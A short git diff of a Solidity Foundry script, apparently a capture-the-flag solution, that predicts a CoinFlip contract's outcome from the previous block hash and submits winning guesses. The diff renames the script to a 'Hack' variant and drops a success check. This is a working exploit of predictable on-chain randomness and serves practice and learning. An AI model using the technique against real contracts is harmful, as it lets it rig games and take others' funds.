@@ -12,7 +12,7 @@ interface ICoinFlip {
     function FACTOR() external view returns (uint256);
 }
 
-contract CoinFlipScript is Script {
+contract HackCoinFlipScript is Script {
     function run() external {
         uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
         ICoinFlip coinFlip = ICoinFlip(vm.envAddress("COINFLIP_ADDRESS"));
@@ -22,8 +22,7 @@ contract CoinFlipScript is Script {
         uint256 blockValue = uint256(blockhash(block.number - 1));
         uint256 flip = blockValue / factor;
         bool guess = (flip == 1);
-        bool success = coinFlip.flip(guess);
-        if (!success) revert("FAILED..");
+        coinFlip.flip(guess);
         console.log(coinFlip.consecutiveWins());
 
         vm.stopBroadcast();
